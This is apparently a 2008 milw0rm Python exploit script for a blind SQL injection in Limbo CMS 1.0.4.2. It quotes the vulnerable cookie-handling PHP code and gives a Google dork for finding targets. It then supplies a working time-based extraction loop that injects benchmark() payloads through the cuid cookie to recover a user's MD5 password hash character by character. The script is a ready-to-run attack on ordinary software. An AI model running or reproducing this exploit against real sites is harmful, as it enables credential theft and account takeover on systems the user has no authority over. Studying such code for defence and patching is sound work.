#!/usr/bin/python
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  >__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                    This is a Public Exploit.                                    #
#				   Date: 08/02/2008 [dd,mm,yyyy]                                  #
#                                                                                                 #
#=================================================================================================#
#         Limbo 1.0.4.2 And Probably Lower Blind Sql Injection Exploit Benchmark Method           #
#                                                                                                 #
#                                       Vendor:   http://www.limbo-cms.com	                  #
#                                     Severity:   Highest                                         #
#                                       Author:   The:Paradox                                     #
#=================================================================================================#
#                                       Proud To Be Italian.                                      #
#=================================================================================================#
"""
                                            Related Codes:
                                        class_auth.php; line 92:

function Auth()
{
if(isset($_SESSION['uid']) && $_SESSION['uid']!='')
	{
	$this->id=$_SESSION['uid'];
	$this->initlogin();
	return;
	}
//cokkie

if(isset($_COOKIE['cuid']) && isset($_COOKIE['cusername']) && isset($_COOKIE['cpassword']))
	{
	global $conn,$lm_rand;
	$row=$conn->GetRow("SELECT * FROM #__users WHERE id=".$_COOKIE['cuid']);
	if($_COOKIE['cusername']==$row['username'] && $_COOKIE['cpassword']==md5($lm_rand.$row['password']) ) {
	$this->id=$_COOKIE['cuid'];
	$this->initlogin();
	}
	}
}

"""
#=================================================================================================#
# Proof Of Concept / Bug Explanation:                                                             #
#                                                                                                 #
# Cuid cookie isn't propelly checked. Blind Sql Injection Vulnerability. In this exploit I'll use #
# benchmark method.                                                                               #
# Additionally database prefix isn't needed, 'cause the coder automatically replaces "#__" with   #
# the prefix in GetRow Function (is a REAL bad practice) .                                        #
# Limbo allows also an installation without sql database (Flat). I'm working on it.               #
# This exploit cannot work on that type of installation.                                          #
#=================================================================================================#
# Google Dork=> Site powered By Limbo CMS	                                                  #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#

import httplib, sys, time
print "\n#=========================================================#"
print "           Limbo CMS 1.0.4.2 And Probably Lower          "
print "            Blind Sql Injection Vulnerability            "
print "                   Benchmark Method                      "
print "                                                         "
print "               Discovered By The:Paradox                 "
print "                                                         "
print " Usage:                                                  "
print " %s [Target] [Path] [User_id]                            " % (sys.argv[0])
print "                                                         "
print " Example:                                                "
print " %s 127.0.0.1 /limbo/ 1                                  " % (sys.argv[0])
print " %s www.host.com / 1                                     " % (sys.argv[0])
print "                                                         "
print "                                                         "
print "#=========================================================#\n"
if len(sys.argv)<=3:	sys.exit()
else:   print "[.]Exploit Starting."

target = sys.argv[1]
path = sys.argv[2]
user_id = sys.argv[3]

benchmark = "200000000" #Set This One
vtime = 6 #Set This One
port = "80"

j=1
h4sh = ""
md5tuple = []

for k in range(48,58):  # 48->57 and 97->102
	md5tuple.append(k)
for k in range(97,103):
	md5tuple.append(k)
md5tuple.append('END')
#Query will Result like this one ===> SELECT * FROM #__users WHERE id=(SELECT/**/IF((ASCII(SUBSTRING(password,1,1))=50),benchmark(30000000,CHAR(0)),null)/**/FROM/**/#__users/**/WHERE/**/id=1)
print "[.]Blind Sql Injection Starts.\n\nHash:"
while j <= 32:
	for i in md5tuple:
		if i == 'END':	sys.exit('[-]Exploit Failed.\n')

		start = time.time()
		conn = httplib.HTTPConnection(target,port)


		conn.request("GET", path + "admin.php", {}, {"Accept": "text/plain","Cookie": "cpassword=1; cusername=1; cuid=(SELECT/**/IF((ASCII(SUBSTRING(password," + str(j) + ",1))=" + str(i) + "),benchmark(" + benchmark + ",CHAR(0)),null)/**/FROM/**/#__users/**/WHERE/**/id="+user_id+");"})
		response = conn.getresponse()
		read = response.read()

		if response.status == 404: sys.exit('[-]Error 404. Not Found.')
		now = time.time()

		if now - start > vtime:
			sys.stdout.write(chr(i))
			sys.stdout.flush()
			h4sh += chr(i)
			j += 1
			break;

print "\n\n[+]All Done.\n-=Paradox Got This One=-"

# milw0rm.com [2008-02-09]